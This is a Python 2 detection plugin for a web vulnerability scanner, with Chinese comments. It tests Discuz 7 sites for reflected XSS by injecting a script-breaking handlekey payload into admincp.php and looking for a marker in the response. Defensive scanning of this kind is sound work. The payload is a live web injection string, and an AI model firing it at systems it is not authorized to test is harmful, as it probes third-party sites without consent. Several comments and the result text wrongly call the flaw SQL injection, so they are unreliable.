# -*- coding: utf-8 -*-
'''
本插件针对 Discuz7系列的showmessage函数 xss攻击漏洞检测
author: lidq
created: 20161209
'''

# 导入SQL注入通用库，本插件是SQL注入基础插件，故写在通用库中
# 导入url请求公用库
from engine.engine_utils.InjectUrlLib import *

from engine.engine_utils.common import *
# 导入日志处理句柄
from engine.logger import scanLogger as logger
# 导入默认的header头
from engine.engine_utils.DictData import headerDictDefault
from engine.engine_utils.rule_result_judge import page_similar


def run_domain(http, config):
    '''
    重写run_url函数，实现检测SQL注入的功能
    有异常时，直接输出异常
    无异常时，以list类型返回检测结果记录
    '''

    # 重新组织请求的参数
    scanInfo = {}
    scanInfo['siteId'] = config['siteId']
    scanInfo['ip'] = config['ip']
    scanInfo['scheme'] = config['scheme']
    scanInfo['domain'] = config['domain']
    scanInfo['level'] = config['level']
    scanInfo['vulId'] = config['vulId']
    headers = headerDictDefault
    # headers['cookie'] = config['cookie']
    headers['cookie'] = "bOX_sid=zFNIm9"
    headers['Host'] = config['domain']
    source_ip = config.get('source_ip')
    responseList = []
    try:
        if source_ip:
            urlBase = scanInfo['scheme'] + "://" + source_ip
        else:
            urlBase = scanInfo['scheme'] + "://" + scanInfo['domain']
        url = urlBase + "/admincp.php?infloat=yes&handlekey=123);alert(/tester_xss_showmessage/);//"
        response = request(url=url, headers=headers)
        if response['httpcode'] == 200:
            if response['response_body'].find("tester_xss_showmessage") != -1:
                if page_similar(response['httpcode'], response['response_body'], config.get('waf_page')):
                    return []
                injectInfo = returnInjectResult(url=url, confirm=1, detail="Discuz7 未对 handlekey 严格过滤导致存在SQL盲注",
                                                response=response)
                responseList.append(getRecord2(scanInfo, injectInfo))
                return responseList

    except Exception, e:
        logger.error("File:Discuz7_xss_showmessage_yd.py:" + str(e))
    return responseList
